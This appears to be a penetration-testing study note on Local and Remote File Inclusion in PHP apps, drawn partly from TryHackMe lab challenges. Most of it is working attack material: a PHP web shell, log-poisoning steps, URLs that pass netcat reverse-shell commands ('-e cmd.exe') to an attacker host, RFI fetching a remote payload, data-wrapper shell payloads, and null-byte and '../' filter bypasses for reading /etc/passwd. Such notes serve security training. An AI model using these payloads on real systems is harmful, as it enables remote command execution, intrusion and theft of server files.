File Inclusion vulns require attacks to execute code and write shell payload somewhere.  
  
**LFI** - Local File Inclusion - When the file is loaded from the same web server.  
**RFI** - Remote File Inclusion - When the file is loaded from an external source.  
  
Exploitation depends on both the language the app is written in and the server config.  
Ex:  
PHP - the version of the language runtime and web server configs (_php.ini_) values like _register_globals_ and _allow_url_ wrappers make a difference.  
  
  
If bind/ reverse bind won't properly execute binaries, verify whether it's a [fully interactive TTY](Fully%20Interactive%20TTY.md):


### ID'ing:
Can be discovered in same way as directory traversals: locate parameters we can manipulate and attempt to use them to load arbitrary files, then execute the contents.  
  
Check parameters to see if they are vulnerable to RFI by changing their values to a URL instead of a local path.  
Default configs for modern PHP versions disables remote URL includes, but we should still test.  
Can use [nc](netcat.md), Apache, or Python to handle the request.  
Host payloads on different ports as any remote connection may be subject to internal firewalls or routing rules.  
  
  
### Exploiting LFI:
WebApp PHP:  
```php
<?php  
    $file = $_GET["file"];  
    include $file;  ?>
```
	App reads in the _file_ param from the request query string, then uses that value with an _include_ statement  
	Means app will execute any PHP code w/in the specified file.  
  
***Note:** If the file were opened with _fread_ and _echo_ were used to display the contents, then any code w/in the file would be displayed rather than executed.  
  
  
### Contaminating Log Files:
If we can't upload a file to the server, we can try to inject code through log file poisoning.  
Submitting a request that includes PHP then using LFI to load the payload can work as most app servers will log all URLs that are requested.  
  
Ex (Using Win client w/ taco sight up & running):  
• Send a log file payload from attacker ip  
```bash
nc -nv 192.168.xxx.166 80
```
  
(UNKNOWN) \[192.168.xxx.10\] 80 (http) open  
```php
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
```
	- Written in PHP hence: \<?php ?\>  
	- Bulk of payload is echo command that will print output to the page  
	- Wrapped in _pre_ HTML tags preserving any line breaks or formatting in the results of the function call.  
	- _shell_exec_ executes an OS cmd retrieving from the “cmd” parameter of the GET request.  
	
 
 - Craft URL that utilize Directory Traversal to locate the Apache _access.log_ file, exploit the app's _include $file;_ statment, & execute the PHP code.
 ```null
 http://192.168.xxx.10/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
```
 
Result:
![[log_poisoning.png]]


To pop a shell:  
- Start listener on attacker box  
```bash
nc -nlvp 80
```
  
- Use log file poisoning to craft URL for reverse bind shell:  
```null
http://192.168.xxx.10/menu.php?file=c:\xampp\apache\logs\access.log&cmd=nc%20192.168.xxx.166%2080%20-e%20cmd.exe
```
   
*NOTE: Important to read any errors that are displayed.  
- Might disclose full web directory  
- Might disclose a define directory the devop forced the webapp to read from (Can circumvent via _?file=directory/../../../../etc/passwd_)  
- Might disclose filtering: Devops filters out _../_ so using _....//....//....//_ works.  
  
  
  
## TryHackMe LFI Challenges:
1. Input form is broken, but need to send POST request with ‘file=’  
```bash
curl -X POST http://10.10.44.240/challenges/chall1.php -d "file=etc/flag1"
```
 
2. Welcome Guest! Only Admins can access the page!  
	- Within Dev > Console  
```html
document.cookie="THM=admin"
```
	& refresh
	
 - Refreshes as admin page  
```html
document.cookie="THM=/etc/flag2"
```
	& refresh.  

- Returns error "Warning: include(includes//etc/flag2.php)  
	- Shows that files are being hosted from w/in _includes_ directory  
	- Shows that there's two _/_ from _includes_ to _etc_  
	- Shows request ends looking for _.php_ files  
```html
document.cookie="THM=../../../../../etc/flag2%00"
```
	& refresh.  
  
3. Include a file  
```null
http://10.10.44.240/challenges/chall3.php?file=/etc/flag3
```

- Returns error “Warning: include(etcflag.php)”  
	- Shows it's exluding _/_ char (Tested for multiple _/_ and all are being filtered)  
	- Shows request ends looking for _.php_ files  
	- Both work:  
```bash
curl -X POST http://10.10.44.240/challenges/chall3.php -d "file=/etc/flag3%00 --output -
```
```bash
curl http://10.10.44.240/challenges/chall3.php -H "Content-Type= application/x-www-form-urlencoded" -d "file=/etc/flag3%00 --output -
```

  
  
### RFI:
Easier to exploit, allows for more payload crafting flexibility, but less common than LFIs as the server must be configured very specifically for them.  
Ex:  
PHP apps must be configured w/ _allow_url_include_ set to ‘ON’ (not default in newer versions)  
If the config file is set w/ a **$** is present in _FilesMatch_, then double extensions are not allowed.  
  
Can test by creating a listener on attack box and crafting the URL:
```null
http://192.168.xxx.10/menu.php?file=http://192.168.xxx.166/evil.txt
```
	If output on attack box shows a GET request for _/evil.txt_ RFI is possible.  
  
  
\*Older versions of PHP have a vulnerability in which a null byte (%00) will terminate any string.  
This trick can be used to bypass file extensions added server-side (using BurpSuite) and is useful for file inclusions because it prevents the file extension from being considered as part of the string.  
In other words, if an app reads in a parameter and appends “.php” to it, a null byte passed in the parameter effectively ends the string without the “.php” extension.  
This gives an attacker more flexibility in what files can be loaded with the file inclusion vulnerability.

\*Another trick for RFI payloads is to end them with a question mark (?) to mark anything added to the URL server-side as part of the query string  
  
  
Simple _webshell_ - software providing Web-based CLI:  
  
- Save the previous php cmd to the _evil.txt_ file  
```php
<?php echo shell_exec($_GET['cmd']); ?>
```
 
- Refresh Apache  
```bash
sudo systemctl restart apache2
```
  
- Once file is in place (_/var/www/html_) & web server running can sent RFI attack URL to vuln web  
```null
http://192.168.xxx.10/menu.php?file=http://192.168.xxx.166/evil.txt&cmd=ipconfig
```

Can set _cmd_ to reverse bind w/ **nc** ^  
  
Pre-written backdoors can be found at _/usr/share/webshells_  
  
  
### PHP Wrappers:
Can be used to exploit [Directory Traversal](9.4.3%20-%20Directory%20Traversal.md) and [LFI](#Exploiting%20LFI) vulns  
  
Can use the _data_ wrapper to embed inline data as part of the URL w/ plaintext or base64 data.  
Provides an alternative payload when local files can't be poisoned.  
  
  
Usage:  
```html
file=data:text/plain,hello world
``` 
	- text/plain - signaling plaintext  
	- , marks start of the contents  
  
  
For shell:  
```bash
http://192.168.xxx.10/menu.php?file=data:text/plain,nc 192.168.xxx.166 8080 -e cmd.exe
```

  

### Null Bytes:
Developers can specify the type of file it's looking for:  
```null
http://target.com/menu.php?file=/etc/passwd
```
becomes
```null
http://target.com/menu.php?file/etc/passwd.php
```

 
Adding the Null Byte _%00_ or _0x00_ to terminate the string and trick the webapp into ignoring everything else afterwards:  
```null
http://target.com/menu.php?file=/etc/passwd%00
```


This is patched in PHP 5.3.4 and above  
  
If the files are blocked, can attempt to view them by adding a _./_ at the end:  
```null
http://target.com/menu.php?file=../../../../etc/passwd/.
```
